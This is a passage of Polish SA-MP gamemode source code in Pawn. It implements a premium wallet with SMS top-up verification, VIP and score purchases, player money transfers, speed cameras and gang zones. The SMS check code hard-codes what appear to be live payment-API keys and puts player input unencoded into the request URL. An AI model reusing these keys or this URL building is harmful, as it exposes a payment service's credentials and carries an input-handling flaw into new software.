					strcat(StrinGS, "{FF0000}3.W przypadku otrzymania bana na serwerze, nie ma mo¿liwoœci zwrotu œrodków wp³aconych do portfela.\n\t{FF0000}Wa¿noœæi us³ug wykupionych za pomoc¹ œrodków z portfela, w przypadku bana up³ywa w normalny sposób.\n\t Jeœli chcesz odzyskaæ do nich dostêp, musisz ubiegaæ siê o odbanowanie.\n\n");
					strcat(StrinGS, "{FF0000}4.Œrodki zgromadzone w portfelu mog¹ zostaæ wykorzystane na us³ugi dodatkowe na serwerze takie jak: Konto V.I.P, Score itp.\n\n");
					strcat(StrinGS, "{FF0000}5.Do³adowuj¹c swój portfel, akceptujesz warunki niniejszego regulaminu oraz regulaminu operatora us³ug Premium SMS\n");
					strcat(StrinGS, "{FF0000}6.Pamiêtaj ¿e jeœli kupisz i bêdziesz nadu¿ywa³ konta ViPme On zostaæ Ci odebrany.\n");
					strcat(StrinGS, "\n\n{C0C0C0}Pe³ny regulamin znajdziesz pod adresem {FFFFFF}4fun-serv.eu/portfel");
					strcat(StrinGS, "\n {C0C0C0}{FFFFFF}2012-2014");
					ShowPlayerDialog(playerid, 999, 0, "{FFE5A1}Regulamin portfela", StrinGS, "OK", "");				
				}
				case 4:
				{
					ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", "Podaj id gracza któremu chcesz wys³aæ pieni¹dze.", "Dalej", "WyjdŸ");
				}
				case 5: Dialog_Show(playerid, DIALOG_KOD_AKTYWACYJNY, DIALOG_STYLE_INPUT, "Darmowy Kod Aktywacyjny", "Aby aktywowaæ darmowy kod na VIP'a wpisz go poni¿ej\n\nKody udostêpniane s¹ na Fanpage, shoutboxie, na serwerze :)", "Dalej", "Anuluj");
				case 6: {
				    Dialog_Show(playerid,VIPINFO,DIALOG_STYLE_MSGBOX,"Mo¿liwoœci VIP","Komendy VIP'a: \n\n- /vogl - Tworzenie og³oszenia VIP\n- /vbank - Wyœwietla nam bank niezale¿nie od miejsca\n- vgranaty - Dostajemy granaty\n- /vjetpack - Dostajemy jetpack\n- /vdotacja - Dostajemy 10000$\n- /vzestaw - Dostajemy zestaw broni VIP\n- /vsay - Wyró¿niona wiadomoœæ na czacie\n- /vrepair - Naprawa pojazdu\n- /vheal - Uleczenie dowolnego gracza\
				    \n- /varmor - Dostajesz kamizelkê za darmo\n- /vcolor - Ustawiasz sobie ¿ó³ty kolor nicku\n- /vinvisible - Niewidzialnoœæ nicku na mapie!!\n- /vpozostalo - Sprawdzenie wa¿noœci konta VIP\n\n\nVIP daje nam te¿ wiêcej innych mo¿liwoœci np. mo¿liwoœæ sadzenia taniej, oraz wiêcej drzewek marihuany! Wiêcej informacji pod komend¹ /ziolohelp.","OK","");
				}
			}
		}
		case DIALOG_PORTFEL_SENDP:
		{
			if(!response)
				return 1;
				
			new p = strval(inputtext);
			pInfo[playerid][player_actionplayer] = p;
			
			if(!IsPlayerConnected(p))
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Podany gracz nie jest pod³¹czony.");
				ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", "Podaj id gracza któremu chcesz wys³aæ pieni¹dze.", "Dalej", "WyjdŸ");
				return 1;
			}
			
			if(!pInfo[p][player_register])
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Podany gracz nie jest zarejestrowany.");
				ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", "Podaj id gracza któremu chcesz wys³aæ pieni¹dze.", "Dalej", "WyjdŸ");
				return 1;
			}
			
			format(string2, sizeof(string2), "Podaj ile pieniêdzy chcesz przes³aæ graczu %s.", playerNick(p));
			ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP2, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", string2, "Dalej", "WyjdŸ");
			
		}
		case DIALOG_PORTFEL_SENDP2:
		{
			new p = pInfo[playerid][player_actionplayer], zlx = strval(inputtext);
			
			if(!IsPlayerConnected(p))
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Podany gracz nie jest pod³¹czony.");
				ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", "Podaj id gracza któremu chcesz wys³aæ pieni¹dze.", "Dalej", "WyjdŸ");
				return 1;
			}
			
			if(!pInfo[p][player_register])
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Podany gracz nie jest zarejestrowany.");
				ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", "Podaj id gracza któremu chcesz wys³aæ pieni¹dze.", "Dalej", "WyjdŸ");
				return 1;
			}	
			if(zlx < 0)
			{
				AddPlayerPenalty(playerid, P_BAN, INVALID_PLAYER_ID, gettime() + 60*60, "bugowanie portfela");
				return 1;
			}
			if(!IsSum(zlx))
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Poda³eœ b³êdn¹ kwotê (mo¿esz wys³aæ 1z³ do 15z³).");
				format(string2, sizeof(string2), "Podaj ile pieniêdzy chcesz przes³aæ graczu %s.", playerNick(p));
				ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP2, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", string2, "Dalej", "WyjdŸ");
				return 1;
			}
			if(zlx > pInfo[playerid][player_portfel] || zlx == 0)
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Nie masz tyle pieniêdzy lub kwota która poda³eœ to 0.");
				format(string2, sizeof(string2), "Nie masz tyle pieniêdzy, lub kwota która poda³eœ to 0.\nPodaj ile pieniêdzy chcesz przes³aæ graczu %s.", playerNick(p));
				ShowPlayerDialog(playerid, DIALOG_PORTFEL_SENDP2, DIALOG_STYLE_INPUT, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Przeœlij {FF0000}•", string2, "Dalej", "WyjdŸ");
				
				return 1;
			}	
			
			 
			GivePlayerPortfel(playerid, (-zlx));
			GivePlayerPortfel(p, zlx);
			
			SendClientMessage(p, COLOR_ERROR, ""chat" Otrzyma³eœ %d z³ do portfela od %s (%d)", zlx, playerNick(playerid), p);
			SendClientMessage(playerid, COLOR_ERROR, ""chat" Wysla³es %d z³ do  %s (%d)", zlx, playerNick(p), p);
			
			
			format(string2, sizeof(string2), "%s wys³a³ %d zl graczu %s (%d)", playerNick(playerid), zlx, playerNick(p), pInfo[p][player_id]);
			AddPlayerLog(playerid, LOG_PORTFEL, string2, "-sendportfel-");
			//OutputLog("portfel", "%s (uid %d, ip %s) to %s (uid %d, ip %s)", playerNick(playerid), pInfo[playerid]
		}
		case DIALOG_PORTFEL_SHOP:
		{
			switch(listitem)
			{
				case 0:
				{
					new buff[256];
					for(new i = 0;i != sizeof protfel_vip;i++)
					{
						format(buff, sizeof buff, "%s»%d dni VIP za %dz³\n", buff, protfel_vip[i][dni], protfel_vip[i][zl]);
					}
					ShowPlayerDialog(playerid, DIALOG_PORTFEL_SHOP_VIP_DIAL, DIALOG_STYLE_LIST, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Kup  {FF0000}» {009325} Vipa{FF0000}•", buff, "Kup", "Anuluj");
				}
				case 1: 
				{
					new buff[256];
					
					for(new i = 0;i != sizeof protfel_sc;i++)
					{
						format(buff, sizeof buff, "%s»%d respektu za %dz³\n", buff, protfel_sc[i][sc], protfel_sc[i][zl]);
					}
					ShowPlayerDialog(playerid, DIALOG_PORTFEL_SHOP_SCORE_DIAL, DIALOG_STYLE_LIST, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Kup  {FF0000}» {009325} Repekt{FF0000}•", buff, "Kup", "Anuluj");
					
				}
			}
		}
		case DIALOG_PORTFEL_SHOP_VIP_DIAL:
		{
			if(!response) return 1;
			
			if(protfel_vip[listitem][zl] > pInfo[playerid][player_portfel])
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Nie masz tyle pieniêdzy w {b}portfelu.");
				return 1;
			}
			pInfo[playerid][player_dialog_data][0] = listitem;
			
			format(string2, sizeof(string2), "{008000}Czy na pewno chcesz kupiæ vip na {FF0000}%d dni {008000}za {FF0000}%d{008000}z³?", protfel_vip[listitem][dni], protfel_vip[listitem][zl]);
			ShowPlayerDialog(playerid, DIALOG_PORTFEL_SHOP_VIP, DIALOG_STYLE_MSGBOX, "Aceept", string2, "Kup", "Anuluj");
		}
		
		case DIALOG_PORTFEL_SHOP_SCORE_DIAL:
		{
			if(!response) return 1;
			
			if(protfel_sc[listitem][zl] > pInfo[playerid][player_portfel])
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Nie masz tyle pieniêdzy w portfelu.");
				return 1;
			}
			pInfo[playerid][player_dialog_data][0] = listitem;
			
			format(string2, sizeof(string2), "{008000}Czy na pewno chcesz kupiæ{FF0000} %d respektu {008000}za {FF0000}%d{008000}z³?", protfel_sc[listitem][sc], protfel_sc[listitem][zl]);
			ShowPlayerDialog(playerid, DIALOG_PORTFEL_SHOP_SCORE, DIALOG_STYLE_MSGBOX, "{FF0000}•{1D8D88}Portfel {FF0000}»{009325} Kup  {FF0000}»{009325} Repekt{FF0000}» Akceptuj{FF0000} •", string2, "Kup", "Anuluj");
		}
		
		case DIALOG_PORTFEL_SHOP_VIP:
		{
			if(!response) return 1;
			
			new listitem2 = pInfo[playerid][player_dialog_data][0];
			
			if(protfel_vip[listitem2][zl] > pInfo[playerid][player_portfel])
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Nie masz tyle pieniêdzy w portfelu.");
				return 1;
			}
			format(string2, sizeof(string2), "%s kupi³ %d dni vip", playerNick(playerid), protfel_vip[listitem2][dni]);
			AddPlayerLog(playerid, LOG_PORTFEL, string2, "-vip-");
			
			GivePlayerPortfel(playerid, -protfel_vip[listitem2][zl]);
			
			if(pInfo[playerid][player_vip] > gettime())
			{
				pInfo[playerid][player_vip] = pInfo[playerid][player_vip] + UnixTime('d', protfel_vip[listitem2][dni]);
			}
			else 
			{
				pInfo[playerid][player_vip] = gettime()	+ UnixTime('d', protfel_vip[listitem2][dni]);
			}
			Iter_Add(Vips, playerid);
			m_query("Update "prefix"_players SET vip = %d WHERE id=%d LIMIT 1", pInfo[playerid][player_vip], pInfo[playerid][player_id]);
			
			SavePlayer(playerid);
			
			SendClientMessage(playerid, COLOR_INFO, ""chat" Kupi³eœ VIP na {b}%d{/b} dni za {b}%d{/b} z³.", protfel_vip[listitem2][dni], protfel_vip[listitem2][zl]);
		}
		
		case DIALOG_PORTFEL_SHOP_SCORE:
		{
			if(!response) return 1;
			
			new listitem2 = pInfo[playerid][player_dialog_data][0];
			
			if(protfel_sc[listitem2][zl] > pInfo[playerid][player_portfel])
			{
				SendClientMessage(playerid, COLOR_ERROR, ""chat" Nie masz tyle pieniêdzy w {b}portfelu.");
				return 1;
			}
			format(string2, sizeof(string2), "%s kupi³ %d respektu", playerNick(playerid), protfel_sc[listitem2][sc]);
			AddPlayerLog(playerid, LOG_PORTFEL, string2, "score");
			
			GivePlayerPortfel(playerid, -protfel_sc[listitem2][zl]);
			GivePlayerScore(playerid, protfel_sc[listitem2][sc]);
			
			SavePlayer(playerid);
			SendClientMessage(playerid, COLOR_INFO, "» Kupi³eœ {b}%d{/b} respektu za {b}%d{/b} z³.", protfel_sc[listitem2][sc], protfel_sc[listitem2][zl]);
		}
		case DIALOG_PORTFEL_ADD:
		{
			if(!response) return 1;
			
			SetPVarInt(playerid, "portfel_smsid", listitem);
			
		
			new msg[800] = "{FFFFFF}Je¿eli chcesz do³adowaæ wirtualny portfel o";
				
			format(msg, sizeof(msg), "%s %d z³ wyœlij SMS o treœci {AC3E00}%s{FFFFFF} na numer{AC3E00} %d{FFFFFF} \nkoszt SMS to %d netto (%s brutto)", msg, API_sms[listitem][Doladowanie], API_sms[listitem][Tesc], API_sms[listitem][Numer], API_sms[listitem][Netto], API_sms[listitem][Brutto]);
			format(msg, sizeof(msg), "%s\nPo wys³aniu SMS wpisz poni¿ej kod zwrotny.\n\n", msg);
			format(msg, sizeof(msg), "%sWysy³aj¹c SMS akceptujesz regulamin us³ug p³atnych dostepny pod komend¹ /portfel\n\n", msg);
			format(msg, sizeof(msg), "%sW weekend gratisowo dostajesz 1z³ do portfela gratis dla do³adowañ wiêkszych ni¿ 1.23z³\n", msg);
			format(msg, sizeof(msg), "%sA w niedzielê przy do³adowaniu portfela kwot¹ 40z³ a¿ 5z³ gratisowo dostaniesz!\n\n", msg);
			format(msg, sizeof(msg), "%sReklamacje dotycz¹ce us³ugi nale¿y sk³adaæ pod adresem: {FF0000}bok@servhost.pl\n", msg);
			format(msg, sizeof(msg), "%sUs³uga zrealizowana przy wspó³pracy z ServHost.pl - Profesjonalnym hostingiem serwerów\n", msg);
			ShowPlayerDialog(playerid, DIALOG_PORTFEL_CODE, DIALOG_STYLE_INPUT, "{FF0000}•{1D8D88}Portfel {FF0000}»{009325} Do³aduj Konto{FF0000} •", msg, "Dalej", "Anuluj");
		
		}
		case DIALOG_PORTFEL_CODE:
		{
			if(!response) return 1;
			
			if(!inputtext[0])
			{
				SendClientMessage(playerid, COLOR_ERROR, "» Poda³eœ b³êdny kod.");
				return 1;
			}
			
			SendClientMessage(playerid, COLOR_INFO, "» Trwa sprawdzanie kodu SMS {b}%s{/b}.", inputtext);
			
			/*
			new msg[256] = "servhost.pl/sms_api.php?key="portfel_api"&code=";
			format(msg, sizeof(msg), "%s%s&number=%d", msg, inputtext, API_sms[GetPVarInt(playerid, "portfel_smsid")][Numer]);
			
			new msg[256] = "admin.serverproject.pl/api/smsapi.php?key=423618f76089d0551ea9ae6ee&amount=";
			format(msg, sizeof(msg), "%s%d&code=%s&desc=server_api", msg, API_sms[GetPVarInt(playerid, "portfel_smsid")][Netto], inputtext);

		 */
		 
			new msg[256] = "servhost.pl/sms_api.php?key=kcdzipinwuardkqf5gvecrn7s&number=";
			//http://servhost.pl/sms_api.php?key=m5swv12sf8j32?577xnv25wvg6&code=DJPOGWFK&number=74550
			format(msg, sizeof(msg), "%s%d&code=%s", msg, API_sms[GetPVarInt(playerid, "portfel_smsid")][Numer], inputtext);
			printf("%s",msg);
			systemprintf_nt("portfel", "[PORTFEL] %s (%d) code - %s", playerNick(playerid), pInfo[playerid][player_id], inputtext);

			HTTP(playerid, HTTP_GET, msg, "", "checkPortfelCode");
		}
	}
	return 1;
}
forward checkPortfelCode(playerid, response_code, data[]);
public checkPortfelCode(playerid, response_code, data[])
{
	//printf("%d data %d response %d", data[0], strval(data[0]), response_code);
    if(response_code != 200) //D
    {
 		SendClientMessage(playerid, COLOR_ERROR, "» Brak odpowiedzi z strony serwera (%d).", data[0]);
		InfoBox(playerid, msg_granient(0xF03C3CFF,"|B³¹d|po³¹czenia|z|API|SMS.\nSpróbuj|ponownie.\n\n|Reklamacje|dotycz¹ce|us³ugi|nale¿y|sk³adaæ|pod|adresem|bok@servhost.pl"));
		return 1;
    }
	OutputLog("portfel", "%s (%d) - %d %s (sms id %d)", playerNick(playerid), pInfo[playerid][player_id], strval(data[0]), data, GetPVarInt(playerid, "portfel_smsid"));
	/*	
	switch(strval(data[0]))
	{
		case -1,-2,2,'E',0:
		{
			InfoBox(playerid, msg_granient(0xF03C3CFF,"|Kod|który|wpisa³eœ|jest|nie|prawid³owy.\n|Je¿eli|jesteœ|pewien|¿e|wpisa³eœ|dobry|kod|spróbuj|ponownie\n\n|Reklamacje|dotycz¹ce|us³ugi|nale¿y|sk³adaæ|na|forum|4fun-serv.pl"));
			SendClientMessage(playerid, COLOR_ERROR, "[Portfel] Kod nie zosta³ akceptowany przez system kod b³edu #%s", data);
		}
		case 1:
		{
		//	this->funtion::gg(splitf("Doladowanie_portfela_przez:_%s_kwot¹:_%dz³",playerNick(playerid),API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]));
			if((GetWeekDay() == 7) && API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie] == 40)
			{
				GivePlayerPortfel(playerid, API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+5);
				format(string2, sizeof(string2), "Do³adowanie %dzl z bonusem +4", API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+5);
				AddPlayerLog(playerid, LOG_PORTFEL, string2, "-recharge-");
				format(string2,sizeof string2,"|\t\t\t\tSUKCES :)!|\n|TWOJE|KONTO|ZOSTA£O|DO£ADOWANE|KWOT¥| %d|z³|\n|ORAZ|Z|OKAZJI|PROMOCJI|OTRZYMA£EŒ|BONUS|W|POSTACI|5Z£|DO|PORTFELA!",API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				InfoBox(playerid, msg_granient(0xFF9933FF, string2));
			} 
			else if((GetWeekDay() == 7 || GetWeekDay() == 6 ) && API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie] !=1)
			{
				GivePlayerPortfel(playerid, API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+1);
				format(string2, sizeof(string2), "Do³adowanie %dzl z bonusem +1", API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+1);
				AddPlayerLog(playerid, LOG_PORTFEL, string2, "-recharge-");		
				format(string2,sizeof string2,"|\t\t\t\tSUKCES :)!|\n|TWOJE|KONTO|ZOSTA£O|DO£ADOWANE|KWOT¥| %d|z³|\n|ORAZ|Z|OKAZJI|PROMOCJI|OTRZYMA£EŒ|BONUS|W|POSTACI|1Z£|DO|PORTFELA!",API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				InfoBox(playerid, msg_granient(0xFF9933FF, string2));
			} 
			else
			{
				GivePlayerPortfel(playerid, API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				format(string2, sizeof(string2), "Do³adowanie %dzl", API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				AddPlayerLog(playerid, LOG_PORTFEL, string2, "-recharge-");
				format(string2,sizeof string2,"|\t\t\tSUKCES :)!|\n|TWOJE|KONTO|ZOSTA£O|DO³ADOWANE|KWOT¥| %d|z³|",API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				InfoBox(playerid, msg_granient(0xFF9933FF, string2));
			}
		 
		}
		default:{
			
			InfoBox(playerid, msg_granient(0xF03C3CFF,"|Kod|który|wpisa³eœ|jest|nie|prawid³owy.\n|Je¿eli|jesteœ|pewien|¿e|wpisa³eœ|dobry|kod|spróbuj|ponownie\n\n|Reklamacje|dotycz¹ce|us³ugi|nale¿y|sk³adaæ|na|forum|4fun-serv.pl"));
			SendClientMessage(playerid, COLOR_ERROR, "[Portfel] Kod nie zosta³ akceptowany przez system kod b³edu #%s", data);
		
		}

	}
*/
	new i = Plugin_GetIntData(MAP_VEHICLES, data);
		
	if(0 > i) i = 0;
		
	if(strfind(data, "fail") == -1 && i == 0) i = 0;

	printf("i: %s response: %s Data: %s",i,response_code,data);
	new ddata = strval(data);
	switch(ddata)
	{
		case 0:
		{
			InfoBox(playerid, msg_granient(0xF03C3CFF,splitf("|Kod|który|wpisa³eœ|jest|nie|prawid³owy.\n|Je¿eli|jesteœ|pewien|¿e|wpisa³eœ|dobry|kod|spróbuj|ponownie\n\n|Reklamacje|dotycz¹ce|us³ugi|nale¿y|sk³adaæ|pod|adresem|bok@servhost.pl\n\nInformacje o bledzie: %s", API_erros[i])));
			SendClientMessage(playerid, COLOR_ERROR, "[Portfel] Kod nie zosta³ akceptowany przez system kod b³edu #%s", data);
		}
		case 1:
		{ 
			if((GetWeekDay() == 7) && API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie] == 40)
			{
				GivePlayerPortfel(playerid, API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+5);
				format(string2, sizeof(string2), "Do³adowanie %dzl z bonusem +4", API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+5);
				AddPlayerLog(playerid, LOG_PORTFEL, string2, "-recharge-");
				format(string2,sizeof string2,"|\t\t\t\tSUKCES :)!|\n|TWOJE|KONTO|ZOSTA£O|DO£ADOWANE|KWOT¥| %d|z³|\n|ORAZ|Z|OKAZJI|PROMOCJI|OTRZYMA£EŒ|BONUS|W|POSTACI|5Z£|DO|PORTFELA!",API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				InfoBox(playerid, msg_granient(0xFF9933FF, string2));
			} 
			else if((GetWeekDay() == 7 || GetWeekDay() == 6 ) && API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie] !=1)
			{
				GivePlayerPortfel(playerid, API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+1);
				format(string2, sizeof(string2), "Do³adowanie %dzl z bonusem +1", API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]+1);
				AddPlayerLog(playerid, LOG_PORTFEL, string2, "-recharge-");		
				format(string2,sizeof string2,"|\t\t\t\tSUKCES :)!|\n|TWOJE|KONTO|ZOSTA£O|DO£ADOWANE|KWOT¥| %d|z³|\n|ORAZ|Z|OKAZJI|PROMOCJI|OTRZYMA£EŒ|BONUS|W|POSTACI|1Z£|DO|PORTFELA!",API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				InfoBox(playerid, msg_granient(0xFF9933FF, string2));
			} 
			else
			{
				GivePlayerPortfel(playerid, API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				format(string2, sizeof(string2), "Do³adowanie %dzl", API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				AddPlayerLog(playerid, LOG_PORTFEL, string2, "-recharge-");
				format(string2,sizeof string2,"|\t\t\t\tSUKCES :)!|\n|TWOJE|KONTO|ZOSTA£O|DO³ADOWANE|KWOT¥| %d|z³|",API_sms[GetPVarInt(playerid, "portfel_smsid")][Doladowanie]);
				InfoBox(playerid, msg_granient(0xFF9933FF, string2));
			}
		}
		case 2:
		{
			InfoBox(playerid, msg_granient(0xF03C3CFF,splitf("|Kod|który|wpisa³eœ|jest|ju¿|wykorzystany.\n|Je¿eli|jesteœ|pewien|¿e|wpisa³eœ|dobry|kod|spróbuj|ponownie\n\n|Reklamacje|dotycz¹ce|us³ugi|nale¿y|sk³adaæ|pod|adresem|bok@servhost.pl\n\nInformacje o bledzie: %s", API_erros[i])));
			SendClientMessage(playerid, COLOR_ERROR, "[Portfel] Kod nie zosta³ akceptowany przez system kod b³edu #%s", data);
		}
		default:
		{
			InfoBox(playerid, msg_granient(0xF03C3CFF,splitf("|Kod|który|wpisa³eœ|jest|nie|prawid³owy.\n|Je¿eli|jesteœ|pewien|¿e|wpisa³eœ|dobry|kod|spróbuj|ponownie\n\n|Reklamacje|dotycz¹ce|us³ugi|nale¿y|sk³adaæ|pod|adresem|bok@servhost.pll\n\nInformacje o bledzie: %s", API_erros[i])));
			SendClientMessage(playerid, COLOR_ERROR, "[Portfel] [Undefined] Kod nie zosta³ akceptowany przez system kod b³edu #%s", data);
		}
	}
	
	return 1;
}
public OnPlayerEnterDynamicArea(playerid, areaid)
{
	pInfo[playerid][player_zonearea] = areaid;
	#if defined ADUIO_
	if(areaid == gmData[impreza_zone] && gmData[impreza_zone] > 0)
	{
		if(!Audio_IsClientConnected(playerid)) 
			return false;
			
		if( pInfo[playerid][player_impreza])
		{
			Audio_Pause(playerid, pInfo[playerid][player_impreza]);
		}
		pInfo[playerid][player_impreza] = Audio_PlayStreamed(playerid, gmData[impreza_sound]);
		Audio_Set3DPosition(playerid, pInfo[playerid][player_impreza], 2235.1514,1025.7859,10.8892, 25.0);
		
		return 1;
	}
	#endif
	new i = 0;
	while (i < zone_count)
	{
	    if(areaid == zone_created[i])
		{
			TextDrawShowForPlayer(playerid, StrefaBezDM);
			pInfo[playerid][player_no_dm] = true;
			break;
		}
		i++;
	}
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		for (i=0;i < RadarsCount;i++)
		{
			if(areaid == RadarInfo[i][RADStrefa])
			{
				new Float:ST[3];
				GetVehicleVelocity(pInfo[playerid][player_usevehicle], ST[0], ST[1], ST[2]);
				new speedx = floatround(floatsqroot(floatpower(ST[0], 2) + floatpower(ST[1], 2) + floatpower(ST[2], 2)) * 200);
				if(speedx > RadarInfo[i][RADlimit])
				{
					
					FlashScreen(playerid);
					SendClientMessage(playerid, COLOR_INFO2, "[FOTORADAR] Przekroczy³eœ dopuszczaln¹ prêdkoœæ! Dosta³eœ mandat %d$", floatround(speedx/4));
					format(string2, sizeof(string2), "~n~~n~~n~~n~~n~~r~Przekroczyles predkosc~n~~w~~h~%d KM", speedx);
					GameTextForPlayer(playerid, string2, 4000, 6);
					
					achievement(playerid, 23);
					if(GetPlayerMoney(playerid) > (floatround(speedx/4)))
						GivePlayerMoney(playerid, (-floatround(speedx/4)));
 					
					pInfo[playerid][player_mandats] ++;
					pInfo[playerid][player_mandatcash] += floatround(speedx/4);
					 
				}
				break;
			}
		}
	}
	foreach(new zones : GangsZones)
	{
		if(gZone[zones][zonestream] == areaid)
		{
			format(string2, sizeof(string2), "Strefa Gangu~n~%s", gInfo[GetGangFromUid(gZone[zones][zonegangid])][gangNazwa]);
			PlayerTextDrawSetString(playerid, GangZoneDraw, string2);
			PlayerTextDrawColor(playerid, GangZoneDraw, SetAlpha(gInfo[GetGangFromUid(gZone[zones][zonegangid])][gangColor], 120));
			
			PlayerTextDrawShow(playerid, GangZoneDraw);
			break;
		}
	}
	return 1;
}
public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	pInfo[playerid][player_zonearea] = 0;
	#if defined ADUIO_PLUGIN
	if(areaid == gmData[impreza_zone])
	{
		if(!Audio_IsClientConnected(playerid)) 
			return false;
		Audio_Pause(playerid, pInfo[playerid][player_impreza]);
	}
	#endif
	new i = 0;
	while (i < zone_count)
	{
	    if(areaid == zone_created[i])
		{
			TextDrawHideForPlayer(playerid, StrefaBezDM);
			pInfo[playerid][player_no_dm] = false;
			break;
		}
		i++;
	}
	foreach(new zones : GangsZones)
	{
		if(gZone[zones][zonestream] == areaid)
		{
			
			PlayerTextDrawHide(playerid, GangZoneDraw);
			return 1;
		}
	}
	return 1;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	pInfo[playerid][player_clickedplayer] = clickedplayerid;
	if(playerid == clickedplayerid)
	{
		if(!pInfo[playerid][player_register])
		{
			SendClientMessage(playerid, COLOR_ERROR, ""chat" Musisz siê {b}zarejestrowaæ{/b} aby mieæ dostêp do zarz¹dzanie kontem.");
			return 1;
		}
		ShowPlayerGui(playerid);
	}
	else 
		Dialog_Show(playerid, DIALOG_PLAYER, DIALOG_STYLE_LIST, "Wykonaj operacjê", ""chat" Poka¿ Statystyki\n"chat" Wyœlij Pieni¹dze\n"chat" Raportuj\n"chat" Poka¿ kary ({dd0000}tylko dla admina!{FFFFFF})", "Dalej", "Anuluj");
	return 1;
}
Dialog:DIALOG_INFFF(playerid, response, listitem, inputtext[])
{
	
	return 1;
}

Dialog:DIALOG_PLAYER(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		new player = pInfo[playerid][player_clickedplayer];
		switch(listitem)
		{
			case 0:
			{
				ShowPlayerStats(player, playerid);	
			}
			case 1:
			{
				if(!pInfo[playerid][player_logged] && pInfo[playerid][player_register]) AddPlayerPenalty(playerid, P_KICK, INVALID_PLAYER_ID, 0, "próba ominiêcia zabezpieczeñ.");
				
				pInfo[playerid][player_dialog_data][0] = 0;
				Dialog_Show(playerid, DIALOG_PLAYER_2, DIALOG_STYLE_INPUT, "Wyœlij Pieni¹dze", "Wpisz sumê jak¹ chcesz wys³aæ Graczu:", "Wyœlij", "Anuluj");
			}
			case 2:
			{
				pInfo[playerid][player_dialog_data][0] = 1;
				Dialog_Show(playerid, DIALOG_PLAYER_2, DIALOG_STYLE_INPUT, "Raportuj Gracza", "Wpisz powód raportu:", "Dalej", "Anuluj");
			}
			case 3:{
				ShowPlayerPenalty(pInfo[playerid][player_clickedplayer], playerid);
			}
		}
	}
	return 1;
}

Dialog:DIALOG_PLAYER_2(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		new player = pInfo[playerid][player_clickedplayer];
		switch(pInfo[playerid][player_dialog_data][0])
		{
			case 0:
			{
				new c = strval(inputtext);
				if(c > GetPlayerMoney(playerid))
				{
					SendClientMessage(playerid, COLOR_ERROR, ""chat" Nie masz tyle pieniêdzy!");
					DialogFunc:DIALOG_PLAYER(playerid, 1, 1, inputtext);
					
					return 1;
				}
				if(c < 0)
				{
					SendClientMessage(playerid, COLOR_ERROR, ""chat" Musisz wys³aæ minimum 1$s");
					DialogFunc:DIALOG_PLAYER(playerid, 1, 1, inputtext);
					return 1;
				}
				SendCash(playerid, player, c, true);
			}
			case 1:
			{
				if(!inputtext[0])
				{
					SendClientMessage(playerid, COLOR_ERROR, ""chat" Musisz wpisaæ powód raportu.");
					DialogFunc:DIALOG_PLAYER(playerid, 1, 2, inputtext);
				}
				AddNewReport(playerid, player, inputtext);
				SendClientMessage(playerid, COLOR_INFO, "» Wys³a³eœ raport.");
			}
		}
	}
	return 1;
}
 
	
public OnPlayerSpawn(playerid)
{	 
	if(IsPlayerNPC(playerid))
